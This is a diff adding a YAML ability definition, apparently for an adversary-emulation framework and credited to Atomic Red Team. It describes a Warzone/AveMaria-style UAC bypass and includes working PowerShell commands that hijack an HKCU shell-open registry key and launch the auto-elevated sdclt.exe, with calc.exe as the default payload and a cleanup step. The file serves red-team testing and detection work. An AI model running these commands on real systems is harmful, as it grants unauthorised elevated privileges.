@@ -1,0 +1,37 @@
+- id: 350b8e4b-520b-4673-bac2-d15aa1862128
+  name: Warzone/AveMaria RAT style UAC bypass
+  description: PowerShell code to bypass User Account Control using registry modification
+    and sdclt.exe. sdclt.exe is an auto-elevated binary, and through editing the registry,
+    it can be hijacked and a user-input process can run with those same privileges.
+    Used by the RAT Warzone/AveMaria, most likely patched on modern Windows versions
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1548.002
+    name: 'Abuse Elevation Control Mechanism: Bypass User Account Control'
+  platforms:
+    windows:
+      psh:
+        command: reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "C:\Windows\System32\calc.exe"
+          /f; reg add HKCU\Software\Classes\Folder\shell\open\command /v "DelegateExecute"
+          /f; Start-Process -FilePath "C:\Windows\System32\sdclt.exe" -WindowStyle
+          Hidden -PassThru
+        cleanup: reg delete "HKCU\Software\Classes\Folder\shell" /f
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - privilege-escalation
+  - atomic-red-team
+  - t1548.002
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      commandtorun:
+        description: Command to run
+        type: string
+        default: C:\Windows\System32\calc.exe
+    technique_created: '2020-01-30T14:24:34.977Z'
+    atomic_guid: 350b8e4b-520b-4673-bac2-d15aa1862128
+    import_timestamp: '2026-09-05T06:41:04.517288Z'
